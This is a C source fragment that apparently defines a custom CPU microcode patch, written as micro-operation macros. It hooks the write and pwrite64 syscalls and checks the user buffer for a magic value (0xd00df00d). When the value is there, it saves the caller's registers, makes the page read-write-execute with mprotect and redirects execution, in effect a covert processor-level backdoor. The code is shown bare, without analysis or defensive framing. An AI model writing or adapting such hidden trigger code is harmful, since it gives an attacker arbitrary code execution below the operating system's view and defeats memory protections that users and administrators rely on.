unsigned long addr = 0x7d30;
unsigned long hook_address = 0x02e0;
ucode_t ucode_patch[] = {
    {   // 0x0
        XOR_DSZ64_DRI(TMP5, RAX, 0x1), // write
        UJMPCC_DIRECT_NOTTAKEN_CONDZ_RI(TMP5, addr+0x6),
        XOR_DSZ64_DRI(TMP5, RAX, 0x12), // pwrite64
        NOP_SEQWORD
    },    
    {   // 0x4
        UJMPCC_DIRECT_NOTTAKEN_CONDZ_RI(TMP5, addr+0x6),
        UJMP_I(addr+0x2c),
        UJMPCC_DIRECT_NOTTAKEN_CONDZ_RI(RSI, addr+0x2c),
        NOP_SEQWORD
    },
    {   // 0x8
        ZEROEXT_DSZ64_DI(TMP6, 0xd00d),
        CONCAT_DSZ16_DRI(TMP6, TMP6, 0xf00d),
        ADD_DSZ64_DRI(TMP4, RSI, 0xd8),
        NOP_SEQWORD
    },
    {   // 0xc
        LDZX_DSZ64_ASZ32_SC1_DR(TMP5, TMP4, 0x18),
        XOR_DSZ64_DRR(TMP5, TMP5, TMP6),
        UJMPCC_DIRECT_NOTTAKEN_CONDNZ_RI(TMP5, addr+0x2c),
        NOP_SEQWORD
    },
    {   // 0x10
        // Save regs
        ZEROEXT_DSZ64_DM(TMP5, IMM_MACRO_ALIAS_RIP),
        SUB_DSZ64_DIR(TMP5, 0x2, TMP5),
        STAD_DSZ64_ASZ32_SC1_RRI(TMP5, TMP4, 0x0, SEG_DS),
        NOP_SEQWORD
    },
    {   // 0x14
        STAD_DSZ64_ASZ32_SC1_RRI(RAX, TMP4, 0x8, SEG_DS),
        STAD_DSZ64_ASZ32_SC1_RRI(RDI, TMP4, 0x10, SEG_DS),
        STAD_DSZ64_ASZ32_SC1_RRI(RSI, TMP4, 0x18, SEG_DS),
        NOP_SEQWORD
    },
    {   // 0x18
        STAD_DSZ64_ASZ32_SC1_RRI(RDX, TMP4, 0x20, SEG_DS),
        NOP,
        // Overwrite regs
        ADD_DSZ64_DRI(TMP5, RSI, 0x100), // jmp rsi+0x100
        NOP_SEQWORD
    },
    {   // 0x1c
        SUB_DSZ64_DIR(RDI, 0x1000, 0),
        AND_DSZ64_DRR(RDI, RDI, RSI),  // rdi = rsi & ~0xfff
        ZEROEXT_DSZ64_DI(RSI, 0x2000), // rsi = 0x2000
        NOP_SEQWORD
    },
    {   // 0x20
        ZEROEXT_DSZ64_DI(RDX, 0x7),    // rdx = PROT_READ | PROT_WRITE | PROT_EXEC
        ZEROEXT_DSZ64_DI(RAX, 0xa),    // rax = mprotect
        UJMP_I(addr+0x2d),
        NOP_SEQWORD
    },
    {   // 0x24
        UJMPCC_DIRECT_NOTTAKEN_CONDNZ_RI(TMP5, addr+0x26),
        UJMP_I(addr+0x28),
        MOVE_DSZ64_DR(RCX, TMP5),
        SEQ_GOTO2(addr+0x29) | SEQ_NOSYNC
    },
    {   // 0x28
        ZEROEXT_DSZ64_DM(RCX, IMM_MACRO_ALIAS_RIP),
        SHR_DSZ64_DRI(TMP0, TMP0, 0x20),
        NOTAND_DSZ16_DIR(TMP0, 0x3, TMP0),
        SEQ_GOTO2(0x1d2) | SEQ_NOSYNC
    },  
    {   // 0x2c
        XOR_DSZ64_DRR(TMP5, TMP5, TMP5),
        UPDATEUSTATE_NOT_I(0x1) | DST_ENCODE(TMP3),
        READURAM_DI(TMP4, 0x84),
        SEQ_GOTO2(0x2e2) | SEQ_NOSYNC
    }
};